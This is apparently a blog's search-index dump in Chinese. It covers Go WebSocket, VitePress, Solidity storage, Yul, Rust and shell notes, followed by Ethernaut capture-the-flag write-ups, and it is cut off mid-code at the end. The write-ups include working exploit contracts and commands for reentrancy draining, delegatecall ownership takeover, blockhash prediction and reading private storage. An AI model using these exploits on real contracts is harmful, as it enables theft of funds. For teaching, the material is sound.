连接的URL，必须是以ws:&#x2F;&#x2F;，wss:&#x2F;&#x2F;或http:&#x2F;&#x2F;，https:&#x2F;&#x2F;开头的字符串。且不能包含查询字符串或片段标识符。\nprotocols: 可选参数，指定子协议的字符串或字符串数组。\n什么是WebSocketWebSocket 是一种在单个 TCP 连接上进行全双工通信的协议。WebSocket 使得客户端和服务器之间的数据交互变得更加简单，允许服务器主动向客户端推送数据。在浏览器和服务器完成一次握手后，两者就直接可以创建一个持久化的连接，并进行双向通信。\nGorilla WebSocketGorilla WebSocket 是 Go 语言中一个流行的 WebSocket 库，提供了对 WebSocket 协议的完整支持。它支持多种功能，包括：\n\n处理 WebSocket 握手\n读写消息\n支持多种消息类型（文本、二进制、ping&#x2F;pong）\n连接管理\n支持子协议和扩展\n错误处理\n\n现在我们来看看如何使用 Gorilla WebSocket 库来实现一个简单的 WebSocket 服务器和客户端。\n安装Gorilla WebSocket只需要使用go get命令安装Gorilla WebSocket库即可。\ngo get github.com/gorilla/websocket\n\n示例场景任何使用WebSocket的场景通常都需要一个服务器端和一个客户端。\n服务器程序绑定到某个端口，并侦听任何传入的WebSocket连接请求。与连接有关的详细信息由websocket协议定义，并通过原始HTTP请求进行协商。\n客户端程序尝试使用websocket URL与服务器建立连接。\nWebSocket服务器示例该服务器将在常规的HTTP服务器上实现，并添加一个socketHandler来处理WebSocket连接请求。\n// server.gopackage main import (    &quot;log&quot;    &quot;net/http&quot;    &quot;time&quot;     &quot;github.com/gorilla/websocket&quot;) var upgrader = websocket.Upgrader&#123;&#125; // use default options func socketHandler(w http.ResponseWriter, r *http.Request) &#123;    // Upgrade our raw HTTP connection to a websocket based one    conn, err := upgrader.Upgrade(w, r, nil)    if err != nil &#123;        log.Print(&quot;Error during connection upgradation:&quot;, err)        return    &#125;    defer conn.Close()     // The event loop    for &#123;        messageType, message, err := conn.ReadMessage()        if err != nil &#123;            log.Println(&quot;Error during message reading:&quot;, err)            break        &#125;        log.Printf(&quot;Received: %s&quot;, message)        err = conn.WriteMessage(messageType, message)        if err != nil &#123;            log.Println(&quot;Error during message writing:&quot;, err)            break        &#125;    &#125;&#125; func home(w http.ResponseWriter, r *http.Request) &#123;    fmt.Fprintf(w, &quot;Index Page&quot;)&#125; func main() &#123;    http.HandleFunc(&quot;/socket&quot;, socketHandler)    http.HandleFunc(&quot;/&quot;, home)    log.Fatal(http.ListenAndServe(&quot;localhost:8080&quot;, nil))&#125;\nGorilla的工作是转换原始HTTP连接进入一个有状态的websocket连接。\n这就是为什么使用struct调用Upgrader来帮助我们的原因。\n我们通过使用全局升级程序变量upgrader.Upgrade()来帮助我们将任何传入的HTTP连接转换为websocket协议。这将返回给我们*websocket.Connection，现在可以使用它来处理websocket连接。\n服务器使用conn.ReadMessage()读取消息，然后使用conn.WriteMessage()写入消息\n该服务器只是将所有传入的Websocket消息回显到客户端，这说明了如何将Websocket用于全双工通信。\nWebSocket客户端示例这个简单的客户端将每隔1s不断发出消息。如果整个系统按预期工作，则服务器将接受间隔为1s的数据包，并回复相同的消息。\n因此客户端还将具有接收传入的websocket数据包的功能。在我们的程序中，我们将有一个单独的goroutine处理程序receiveHandler，用于侦听这些数据包。\n// client.gopackage main import (    &quot;log&quot;    &quot;os&quot;    &quot;os/signal&quot;    &quot;time&quot;     &quot;github.com/gorilla/websocket&quot;) var done chan interface&#123;&#125;var interrupt chan os.Signal func receiveHandler(connection *websocket.Conn) &#123;    defer close(done)    for &#123;        _, msg, err := connection.ReadMessage()        if err != nil &#123;            log.Println(&quot;Error in receive:&quot;, err)            return        &#125;        log.Printf(&quot;Received: %s\\n&quot;, msg)    &#125;&#125; func main() &#123;    done = make(chan interface&#123;&#125;) // Channel to indicate that the receiverHandler is done    interrupt = make(chan os.Signal) // Channel to listen for interrupt signal to terminate gracefully     signal.Notify(interrupt, os.Interrupt) // Notify the interrupt channel for SIGINT     socketUrl := &quot;ws://localhost:8080&quot; + &quot;/socket&quot;    conn, _, err := websocket.DefaultDialer.Dial(socketUrl, nil)    if err != nil &#123;        log.Fatal(&quot;Error connecting to Websocket Server:&quot;, err)    &#125;    defer conn.Close()    go receiveHandler(conn)     // Our main loop for the client    // We send our relevant packets here    for &#123;        select &#123;        case &lt;-time.After(time.Duration(1) * time.Millisecond * 1000):            // Send an echo packet every second            err := conn.WriteMessage(websocket.TextMessage, []byte(&quot;Hello from GolangDocs!&quot;))            if err != nil &#123;                log.Println(&quot;Error during writing to websocket:&quot;, err)                return            &#125;         case &lt;-interrupt:            // We received a SIGINT (Ctrl + C). Terminate gracefully...            log.Println(&quot;Received SIGINT interrupt signal. Closing all pending connections&quot;)             // Close our websocket connection            err := conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, &quot;&quot;))            if err != nil &#123;                log.Println(&quot;Error during closing websocket:&quot;, err)                return            &#125;             select &#123;            case &lt;-done:                log.Println(&quot;Receiver Channel Closed! Exiting....&quot;)            case &lt;-time.After(time.Duration(1) * time.Second):                log.Println(&quot;Timeout in closing receiving channel. Exiting....&quot;)            &#125;            return        &#125;    &#125;&#125;\n如果您观察代码，您会发现创建了两个通道done，interrupt用于receiveHandler()和main()之间的通信。\n我们使用无限循环 + select来监听通道事件。conn.WriteMessage()每秒钟写一条消息。如果激活了中断信号，则所有未决的连接都将关闭，并且正常退出！\n嵌套select是为了确保两件事：\n\n如果receiveHandler通道退出，则通道done将关闭。这是第一个case &lt;-done条件\n如果done通道未关闭，则在1秒钟后会有超时，因此程序将在1秒钟超时后退出\n\n"},{"title":"vitePress","url":"/2025/07/29/vitePress/","content":"VitePress 是什么？VitePress 不只是一个静态站点生成器，它是一个使用 Vue.js 和 Vite 技术的现代网站构建工具。它结合了 Vite 的快速热重载和 Vue 的反应式特性，为开发者提供了一个非常高效的页面开发和构建流程。这意味着你可以享受到即时的页面更新和极快的构建速度，无论是在开发过程中还是在最终的站点部署时。\n核心架构Vite：作为现代前端开发和构建工具，Vite 提供了极快的服务器启动和热模块替换（HMR）。\nVue.js：用于创建互动式 UI 和前端动态内容。Vue 的组件系统允许你以模块化的方式构建页面。\nMarkdown：所有的内容都是用 Markdown 编写的，这使得内容创作变得简单而直观。Markdown 文件可以轻松转换成 HTML，同时支持 Vue 组件，让你可以在文档中嵌入动态内容。\n特点速度与效率：VitePress 的最大卖点之一是其出色的性能。使用 Vite 作为底层工具，它实现了极快的页面加载和热更新，大大提高了开发效率。\nSEO 友好：虽然是一个单页面应用（SPA）生成器，但 VitePress 生成的页面是 SEO 友好的。它在构建时生成静态 HTML，确保了内容的可索引性。\n静态资源处理：VitePress 提供了先进的静态资源处理能力，包括图片、样式表和 JavaScript 文件的优化。这意味着你可以轻松管理和部署资源，确保网站的快速加载。\n易于定制和扩展：VitePress 的架构设计允许你轻松定制主题和扩展功能。你可以使用 Vue 组件和 Vite 插件来增强你的站点，无论是添加自定义功能还是改进用户界面。\n案例步骤 1：设置项目结构首先，我们初始化 VitePress 项目。创建一个新的文件夹并运行 npm init vitepress 来安装 VitePress。项目的基本结构将包括：\ndocs 文件夹：存放所有文档内容。.vitepress 文件夹：用于存放配置文件和主题组件。index.md：网站的主页内容。\n步骤 2：内容撰写与组织接下来，我们在 docs 文件夹中创建 Markdown 文件来编写文档。为了保持组织性，我们可以按照不同的主题或部门将文档分门别类：\napi 文件夹：存放 API 文档。guides 文件夹：存放各类指南。internal 文件夹：存放内部文档。\n每个文件夹中的文档都会有自己的 README.md，作为该部分的入口点。\n文件管理系统：储存位置管理\n存取安全与权限管理\n版本控制\n操作稽核记录\n文件签入签出与锁定\n","tags":["vite","vue"]},{"title":"temp","url":"/2023/04/08/temp/","content":"\n以太坊的数据存储对于固定大小的变量EVM会直接将他们按顺序从0开始存储在每个存储位中，每个存储位都是32字节（256bit），是一种键值对的形式。\npragma solidity^0.8.10;contract test&#123;    uint256 public a=9;    uint256[2] public b;    address c;    function t() public &#123;        b[0] = 63;        b[1] =96;        c = msg.sender;    &#125;&#125;\n这里就可以看到对于32字节固定长度的数据每个都占据一个key，key&#x3D;1对应变量a的存储位。key&#x3D;1，2对应变量b的两个存储位。相应的value便是变量的值。因为在EVM中存储数据是需要消耗gas的，不论是永久的storage还是内存的memory只是消耗的gas量不同（storage比memory更昂贵），所以solidity里进行了一定的存储优化，简单来讲，即定义的这个变量所占的空间小于32个字节时，它所占据的这个存储位的空间可以与它后面的变量共享（当然前提是这个变量塞的下去）因为在EVM里将数据写入一个新位置和写入一个已经分配出来的位置所需的gas是不一样的。\nuint16 public d=12;  uint16 public g=8;  bytes16 public name=&quot;lex&quot;;可以看到上面三个变量占用了同一个存储位key&#x3D;0，但占 用着空间的不同位置。实现了存储的共享对于动态数据的存储，有着自己的计算规则：keccak256(bytes32(key)+bytes32(position))此处的key为映射的key，position则是定义变量的位置。根据此式我们可以算出变量存储位置\nYulYul先前也被称为JULIA或者IULIA，是一种中间语言，可以编译为不同后端的EVM字节码。\n\n经常用于单机模式或者出现于solidity的内联汇编中。编译器使用 Yul 作为基于 IR 的代码生成器（“new codegen”或“IR-based codegen”）中的中间语言。\n如何产生Yul的设计主要是为了以下几点：\n\n用Yul编写的程序更易于阅读和理解，即使代码是由solidity或其他高级语言的编译器生成的。\n代码执行流程易于理解，可以帮助开发者更好地检查、验证和优化。\n从Yul到字节码的转换应尽可能简单，更容易地进行。\nYul对整个程序有优化的作用。\n\nYul提供了高级结构，例如for loops、if 、switch和函数调用来体现汇编程序的控制流。因此没有提供SWAP，DUP，JUMPDEST等指令，此外，形式 mul(add(x, y), 7) 的函数语句优于纯操作码语句（如 7 y x add mul），因为在第一种形式中，更容易看出哪个操作数用于哪个操作码\n尽管Yul还是为堆栈设计的，但它并没有体现堆栈本身的复杂性。\n为了避免值和引用等概念之间的混淆，Yul 是静态类型的。同时，有一个默认类型（通常是目标机器的整数类型）\n为了让Yul的语法更简单和灵活，Yul没有内置操作、函数或类型。\n枚举类型是什么？枚举类型是一种用户自定义类型，方便表示多种状态。\n实际上enum在EVM中是以整数类型存储（默认uint8，成员数量超过255会自动转变为uint16。），从0开始，每个值会映射到一个唯一的整数。\n因此，枚举类型变量也可以与整数进行显式转换，并且在转换运行时会检查数值范围，如果不匹配将会抛出异常。\n以下是示例代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.16;contract InitialDefaultValueDemo &#123;    // 定义    enum Suit &#123; Spades, Clubs, Diamonds, Hearts&#125;    // 不需要;结尾    // 声明枚举类型变量，可以有修饰符    Suit enumVariable1;    Suit public enumVariable = Suit.Hearts;  //可以直接使用枚举内元素赋值    // 通过显式转换赋值    Suit enumVariable2 = Suit(2);    // Suit enumVariable3 = Suit(5);    编译时会出现以下错误        // TypeError: Explicit type conversion not allowed from &quot;int_const 5&quot; to &quot;enum InitialDefaultValueDemo.Suit&quot;.    //   --&gt; scp2023/contracts/Chapter03/InitialDefaultValueDemo.sol:14:26:    //    |    // 14 |     Suit enumVariable3 = Suit(5);    //    |                          ^^^^^^^    // 未初始化的变量默认为第一个成员值    function getEnumDefaultValue1() public view returns (Suit)&#123;        return enumVariable1;   // 0    &#125;        function getEnumDefaultValue2() public view returns (Suit)&#123;        return enumVariable2;   // 2    &#125;&#125;\n执行结果：\n\n\n对于枚举类型成员赋值的解答成员的值不能由用户赋予，只是存储时的映射关系，更不可能在定义枚举时进行赋值操作。但通过改变成员排列顺序可以使成员的值发生变化。\n问题2：\nlibrary与contract的区别：库（library）是一种特殊类型的合约，与Java中的抽象类相似，用于重用代码，增强合约的模块化。\n库的特点之一：库不能包含状态变量。它们是静态的，不会处理任何状态信息。因此，库无法直接持有枚举类型的值，也不能返回枚举类型成员的值。\n未初始化的结构体从slot0开始，同时，每个成员变量占据一个slot槽\n\n\n\n\nrust 占位符 {}!符号，是一个宏规则。{0}放置数字可以将可变参数当做数据来指定获取&#123;&#123;转义&#123;`  `&#125;&#125;转义&#125; 其他转义字符反斜杠开头\nRust 是强类型语言，但具有自动判断变量类型的能力。这很容易让人与弱类型语言产生混淆。默认情况下，Rust 中的变量是不可变的，除非使用mut关键字声明为可变变量。\nRust 语言不允许精度有损失的自动数据类型转换。\n\n如果我们编写的程序的一部分在假设值永远不会改变的情况下运行，而我们代码的另一部分在改变该值，那么代码的第一部分可能就不会按照设计的意图去运转。由于这种原因造成的错误很难在事后找到。\n\nconst a: i32 &#x3D; 123;let a &#x3D; 456;变量的值可以”重新绑定”，但在”重新绑定”以前不能私自被改变，这样可以确保在每一次”绑定”之后的区域里编译器可以充分的推理程序逻辑。 虽然 Rust 有自动判断类型的功能，但有些情况下声明类型更加方便：\nRust 是静态类型语言，在变量声明时可以显式指定类型，但通常可以依赖类型推断。基本类型: i32 (32位有符号整数), u32 (32位无符号整数), f64 (64位浮点数), bool (布尔类型), char (字符)\n函数Rust 函数通过 fn 关键字定义，函数的返回类型通过箭头符号 -&gt; 指定。如果函数没有返回值，类型默认为 ()（即空元组）。\nfor 循环\nfor number in 1..4 &#123;    println!(&quot;&#123;&#125;!&quot;, number);&#125;\n\n"},{"title":"internal-network-penetration","url":"/2025/07/27/internal-network-penetration/","content":"内网穿透了解什么是内网穿透安装 NPS 服务端NPS 默认的WEB端口为80，443, 如果端口被占用，请修改nps.conf中的http_proxy_port，https_proxy_port为其他端口。 web管理端口默认为8080，服务端启动后，输入：ip:8080即可访问。\n安装 NPS 客户端(NPC)客户端配置有两种方式，无配置文件模式（推荐），配置文件模式。\n\n无配置文件模式：点击安装后，输入服务地址、连接密钥，即可启动客户端。不建议修改连接方式和开启TLS参数。\n\n如果需要配置多个客户端，直接安装多个即可（注意名字不要重复）。\n\n\n\n"},{"title":"shell","url":"/2025/08/24/shell/","content":"shell 脚本的学习与记录\n脚本开头通常需要指定解释器路径，例如：\n常见的写法还有#!/usr/bin/env bash，这种写法可以在不同系统中更灵活地找到bash解释器的位置。\n函数里$1 `` $2… 获取参数，$@获取所有参数。\n彩色输出常量：\n\\033 表示 ANSI 转义序列，用于在终端里控制颜色。\n0;31m → 红色0;32m → 绿色0;33m → 黄色\nNC&#x3D;’\\033[0m’ 用来重置颜色，避免后续输出都带颜色。\n常见扩展：蓝色 0;34m，紫色 0;35m，青色 0;36m。\n&gt;&amp;2表示输出到**标准错误流 (stderr)**，方便脚本中区分错误和正常输出。\n脚本示例：\n#!/bin/bash# --- 彩色输出常量 ---RED=&#x27;\\033[0;31m&#x27;GREEN=&#x27;\\033[0;32m&#x27;YELLOW=&#x27;\\033[0;33m&#x27;NC=&#x27;\\033[0m&#x27; # No Color# --- 日志函数 ---log_info() &#123;    echo -e &quot;$&#123;GREEN&#125;[INFO] $(date &#x27;+%Y-%m-%d %H:%M:%S&#x27;) ==&gt; $1$&#123;NC&#125;&quot;&#125;log_warn() &#123;    echo -e &quot;$&#123;YELLOW&#125;[WARNING] $(date &#x27;+%Y-%m-%d %H:%M:%S&#x27;) ==&gt; $1$&#123;NC&#125;&quot;&#125;log_error() &#123;    echo -e &quot;$&#123;RED&#125;[ERROR] $(date &#x27;+%Y-%m-%d %H:%M:%S&#x27;) ==&gt; $1$&#123;NC&#125;&quot; &gt;&amp;2&#125;"},{"title":"Coin Flip","url":"/2023/11/15/Ethernaut/coinflip/","content":"任务要求：连续猜对硬币的正反面十次。区区千分之一的运气我也不是没有  \n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n解题点：硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。\n然而，最优解是通过在另外一份合约，执行预测逻辑，获得对应结果后再调用coinflip完成目标。\n参考：获取实例地址在remix上部署一份攻击合约\ncontract Hack &#123;  CoinFlip target;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor(address _target) &#123;    target = CoinFlip(_target);  &#125;  function flip() public &#123;    bool guess = _guess();    target.flip(guess);  &#125;  function _guess() private view returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    return side;  &#125;&#125;\n之后连续使用攻击合约的flip方法进行攻击10次就行\n\nTips：SafeMath库：防溢出的增强型运算方法block.num：当前区块数（需要添加一个与web3的链接block.blockhash：区块哈希值\n\n\n","categories":["Ethernaut"],"tags":["题解","Ethereum"]},{"title":"Delegation","url":"/2023/11/15/Ethernaut/delegation/","content":"任务要求：获取合约的所有权  \n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;  address public owner;  constructor(address _owner) &#123;    owner = _owner;  &#125;  function pwn() public &#123;    owner = msg.sender;  &#125;&#125;contract Delegation &#123;  address public owner;  Delegate delegate;  constructor(address _delegateAddress) &#123;    delegate = Delegate(_delegateAddress);    owner = msg.sender;  &#125;  fallback() external &#123;    (bool result,) = address(delegate).delegatecall(msg.data);    if (result) &#123;      this;    &#125;  &#125;&#125;\n分析：这题包含了两个合约Delegation和Delegate，Delegation合约实例化了Delegate合约，又在其Fallback()中使用了delegatecall来调用了delegate合约。\n\ncall函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool）和返回的数据（ bytes memory）。而delegatecall（委托调用）又与call有所不同：通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。这个函数主要是方便我们使用存在其他地方的函数——合约可以在运行时动态地从不同的地址加载代码。（用户必须确保两个合约中的存储结构都适合使用delegatecall。）\n\n解题点：delegate.sol合约中有一个公共的pwn()，可以将owner更改为调用者。\n而在Delegation.sol中，而使用detegatecall执行的环境是被调用合约，因此上面通过pwn()修改的owner也即是Delegation.owner，同时也是我们本题的目标。\n因此我们只需通过调用Fallback函数，进行委托调用，更新owner。\n解题参考：在控制台上直接调用contract.sendTransaction(&#123;data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)&#125;)，这表示向合约直接发送一个消息，接着能够直接进入Fallback函数中去。\n或者直接获取实例地址，复制合约到Remix中，在Delegate合约中Ataddress &#39;你获得的实例地址&#39;部署合约，通过调用pwn()也能够实现目标。\n但可能因为gas原因无法正常交易，提高燃料限制再进行交易\n\n","categories":["Ethernaut"],"tags":["题解","Ethereum"]},{"title":"Fallout","url":"/2023/11/15/Ethernaut/fallout/","content":"任务要求：获取合约的所有权\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Fallout &#123;    using SafeMath for uint256;  mapping (address =&gt; uint) allocations;  address payable public owner;  /* constructor */  function Fal1out() public payable &#123;    owner = msg.sender;    allocations[owner] = msg.value;  &#125;  modifier onlyOwner &#123;\t        require(\t            msg.sender == owner,\t            &quot;caller is not the owner&quot;\t        );\t        _;\t    &#125;  function allocate() public payable &#123;    allocations[msg.sender] = allocations[msg.sender].add(msg.value);  &#125;  function sendAllocation(address payable allocator) public &#123;    require(allocations[allocator] &gt; 0);    allocator.transfer(allocations[allocator]);  &#125;  function collectAllocations() public onlyOwner &#123;    msg.sender.transfer(address(this).balance);  &#125;  function allocatorBalance(address allocator) public view returns (uint) &#123;    return allocations[allocator];  &#125;&#125;\n解题点：\ncontract Fallout is Ownable &#123;...function Fal1out() public payable &#123;...\n注意solidity版本为0.6，这意味着该合约的构造函数是由function 合约名实现的，而在此合约中作为构造函数其名称居然与合约名称不一致，使其成为了任何人都可以执行的公共函数\n\n在solidity 0.4.22版本及其之后中使用function声明构造函数的方法被舍弃，而采用了使用关键字constructor来声明构造函数。\n\n这是在使用编译器0.4.22之前的版本时所需注意的\n\n\n参考：直接调用Fal1out()\n\n","categories":["Ethernaut"],"tags":["题解","Ethereum"]},{"title":"Fallback","url":"/2023/11/15/Ethernaut/fallback/","content":"任务要求：获取合约的所有权；将余额减为零源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n解题点：\nreceive() external payable &#123;  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);  owner = msg.sender;&#125;\n通过标记owner变量快速查询有关获取合约的所有权的代码。\n在receive方法中我们能够更改owner，在此之前需要我们在contributions中有一点余额，这只需要执行contribute方法就能实现。\n解题参考：1）执行实例中的contribute()，向合约发送最多0.001 ether。2）向合约发送以太，触发receive()。3）执行实例中的withdraw()。\n\nreceive()\n\n一个合约至多含有一个receive()函数,\n没有function关键字、没有参数，没有返回值\n可见性必须声明为external，必须含有payable关键字\n允许使用modifier修改器\n\n当本合约收到ether但并未被调用任何函数，未接受任何数据，receive()被触发，执行ether的传输（类似于基本的send(),transfer()）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常\n选自solidity官方文档v0.8.13\n\n\n","categories":["Ethernaut"],"tags":["题解","Ethereum"]},{"title":"Ethernaut","url":"/2023/02/25/Ethernaut/Ether/","content":"此文章会记录在Ethernaut上经历的题。\n\nHello Ethernaut在第一题中，我们会跟着引导通过web终端进行操作，基本上没什么难度，一步步地按照提示来做就行。你甚至可以通过直接查看合约ABI来推断出答案，实在是太友好了！！收获：  \n\n关键字的使用\n各种变量的存储位置\n\n\nForce任务要求：让合约的balance大于0\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force &#123;/*                   MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =ø= / (______)__m_m)*/&#125;\n解题点：MEOW~（不是）\n在以太坊中可以强制给一个合约发送以太，无论合约是否拒绝。通过函数selfdestruct来实现。\n\n这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送的资金会无视这一点。\n\n因此我们只需要创建一个合约往合约中存点eth然后调用selfdestruct发送给实例合约就行。\n\n在最新版本的solidity中selfdestruct已经被禁用了\n\n\nVault任务要求：将合约中的bool值改变\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;  bool public locked;  bytes32 private password;  constructor(bytes32 _password) &#123;    locked = true;    password = _password;  &#125;  function unlock(bytes32 _password) public &#123;    if (password == _password) &#123;      locked = false;    &#125;  &#125;&#125;\n\n解题点：输入密码废话\n任何数据在区块链上都是透明的！（战术后仰）通过web3中的getStorageAt函数直接获取合约里的状态变量的值\n\nweb3.eth.getStorageAt(address, position [, defaultBlock] [, callback])参数1：String 获取存储的地址；参数2：存储的索引位置；参数3：（可选）不使用web3.eth.defaultBlock设置的默认块，而是自定义或预定义的块号；参数4：（可选）可选回调，返回一个错误对象作为第一个参数，结果作为第二个参数Returns ：返回给定位置的值\n选自web3.eth官方文档\n\n在控制台中输入web3.eth.getStorageAt(InstenceAddress, 1)，得到密码——因为在slot0中存储的是锁的状态，所以我们要的是slot1中的密码\n接着，直接调用contract.unlock(&quot;上面获得的数据&quot;)就能通关了。\n\nKing任务要求：确保王位\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King &#123;  address king;  uint public prize;  address public owner;  constructor() payable &#123;    owner = msg.sender;      king = msg.sender;    prize = msg.value;  &#125;  receive() external payable &#123;    require(msg.value &gt;= prize || msg.sender == owner);    payable(king).transfer(msg.value);    king = msg.sender;    prize = msg.value;  &#125;  function _king() public view returns (address) &#123;    return king;  &#125;&#125;\n解题点：payable(king).transfer(msg.value);\n当新的国王诞生时将会给老国王原来的奖金，那么只要原来的国王不接受直接进行revert，那么就可以永远的占据合约的king\n参考：\npragma ...contract attack&#123;  constructor (address _addr) public payable&#123;    _addr.call&#123;gas:100000000,value:msg.value&#125;;  &#125;  // 可以通过不创建任何Fallback或receive方法，也可以通过如下方法  receive() external payable &#123;    revert();  &#125;&#125;\n\nRe-entrancy任务要求：盗取合约中的所有代币\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Reentrance &#123;    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;\n解题点：\nfunction withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;\n在整个合约中，只有这个函数才能将代币发送出去：他会接受一个输入，只要我们的余额大于等于指定的金额将会进行发送；然后更新余额。\n因此这是个典型的重入攻击，我们在msg.sender.call()接受余额的同时执行我们的Fallback函数，在fallback中继续调用withdraw。\n同时我们需要再某个时刻打破这个循环，否则会revert：首先可以获取目标合约的余额作为提取的最大金额，我们提取的金额最大为存入的金额，因此将其作为最小值。\n在min(1e18,address(target).balance)中，我们每次获取目标的金额进行判断，在其未归零前都可以进行取款操作。\ncontract Hack &#123;  Reentrance private target;  constructor(address _target) &#123;    target = Reentrance(_target);  &#125;  function attack() external payable &#123;    target.donate&#123;value: 1e18&#125;(address(this));    target.withdraw(1e18);  &#125;  receive() external payable &#123;    uint amount = min(1e18,address(target).balance);    if (amount &gt; 0) &#123;      target.withdraw(amount);    &#125;  &#125;  function min(uint x,uint y) private pure returns (uint) &#123;    return x &lt;= y ? x : y;  &#125;&#125;\n重入的关键：发送完成后才进行了sender的balances更新\n\nElevator这个电梯不让你到达顶楼，想办法到达顶楼\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123;  function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123;  bool public top;  uint public floor;  function goTo(uint _floor) public &#123;    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) &#123;      floor = _floor;      top = building.isLastFloor(floor);    &#125;  &#125;&#125;\n该题提供了一个接口Building，我们执行goTo()方法时，在Elevator合约中将在我们的地址上执行接口，接着该接口又会调用isLastFloor函数两次，为了执行判断内语句，第一次isLastFloor返回的结果要求False，接着第二次调用返回的结果需要是True。因此我们只需要实现一个能够在两次调用中实现相反输出的isLastFloor函数。\ncontract Hack &#123;    Elevator private target;    bool private b = true;    constructor (address _target) &#123;      target = Elevator(_target);    &#125;    function isLastFloor(uint) external returns(bool) &#123;        b = !b;        return b;    &#125;        function pwn() public &#123;        target.goTo(1); //输入的数并不最要    &#125;&#125;\n\nPrivacy任务要求：解锁合约。\n源代码：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy &#123;  bool public locked = true;  uint256 public ID = block.timestamp;  uint8 private flattening = 10;  uint8 private denomination = 255;  uint16 private awkwardness = uint16(block.timestamp);  bytes32[3] private data;  constructor(bytes32[3] memory _data) &#123;    data = _data;  &#125;    function unlock(bytes16 _key) public &#123;    require(_key == bytes16(data[2]));    locked = false;  &#125;  /*    A bunch of super advanced solidity algorithms...      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\\      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU  */&#125;\n合约部署需要一个包含3个bytes32元素的数组。而在solidity中是无法直接传递固定大小的数组，可以猜测实例是通过另一个合约协助部署的类似于：\ncontract PrivacyDeployer &#123;    Privacy public privacyInstance;    constructor() &#123;        // Example data for _data 